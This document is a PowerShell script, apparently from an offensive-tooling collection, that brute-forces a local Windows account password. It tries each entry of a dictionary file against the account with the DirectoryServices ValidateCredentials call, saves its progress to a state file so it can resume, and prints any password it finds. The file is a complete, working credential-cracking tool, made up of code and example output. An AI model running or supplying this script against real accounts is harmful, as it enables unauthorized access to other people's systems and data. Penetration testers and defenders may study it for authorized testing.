<#
.SYNOPSIS
   Brute Force User Account Password (LogOn)

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.1

.DESCRIPTION
   This CmdLet brute forces user account password with the help of native
   DirectoryServices.AccountManagement API and passwords.txt dicionary file

.NOTES
   Its mandatory the import of this cmdlet before usage.

.EXAMPLE
   PS C:\> Import-Module -Name .\localbrute.ps1 -Force
   Import-Module its mandatory requirement before usage

.EXAMPLE
   PS C:\> localbrute pedro $Env:TMP\passwords.txt debug
   Brute force pedro account password using passwords.txt

.OUTPUTS
   Brute Force [ pedro ] account
   -----------------------------
   DEBUG: trying password [0]: toor
   DEBUG: trying password [1]: pedro
   DEBUG: trying password [2]: s3cr3t
   DEBUG: trying password [3]: qwerty
   Attempt StartTime EndTime  Account Password
   ------- --------- -------  ------- --------
   3       18:26:43  18:27:11 pedro   qwerty
#>

Function localbrute {

  param($u,$dct,$debug)
  $d = $dct -replace ".*\\" -replace ".*/"
  
  $ErrorActionPreference = "SilentlyContinue" 
  $i = ((gc .\localbrute.state | sls "^${u}:.*:True:.*") -Split(":"))[3]
  If($i){
    echo "`nPassword for $u account already found: $i"
    return
  }
  
  $user = [Environment]::UserName
  $TimeStampStart = Get-Date -format "HH:mm:ss"
  $ii = (gc .\localbrute.state | sls "^${u}:${d}:" | Select -Last 1) -Split(":");$i = $ii[2]/1
  If($debug){Write-Host "`nBrute Force [ $user ] account" -ForeGroundColor Yellow;echo "-----------------------------"}
  try {
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
    $t = [DirectoryServices.AccountManagement.ContextType]::Machine
    $a = [DirectoryServices.AccountManagement.PrincipalContext]::new($t)
    ForEach($p in (gc $dct|Where-Object { $_.readcount -gt $i })){
      If($debug){echo "DEBUG: trying password [${i}]: $p"}
      If($a.ValidateCredentials($u,$p)){
        echo "${u}:${d}:True:${p}" >> localbrute.state

        ## Create Data Table for output
        $TimeStampEnd = Get-Date -format "HH:mm:ss"
        $mytable = New-Object System.Data.DataTable
        $mytable.Columns.Add("Attempt")|Out-Null
        $mytable.Columns.Add("StartTime")|Out-Null
        $mytable.Columns.Add("EndTime")|Out-Null
        $mytable.Columns.Add("Account")|Out-Null
        $mytable.Columns.Add("Password")|Out-Null
        $mytable.Rows.Add("$i",
                          "$TimeStampStart",
                          "$TimeStampEnd",
                          "$user",
                          "$p")|Out-Null

        ## Display Data Table
        $mytable|Format-Table -AutoSize > $Env:TMP\KeyDump.log
        Write-Host "";Get-Content -Path "$Env:TMP\KeyDump.log"
        Remove-Item -Path "$Env:TMP\KeyDump.log" -Force
        return
      }
      $i++
    }
  } finally {
    echo "${u}:${d}:${i}:${p}" >> localbrute.state
  }	
}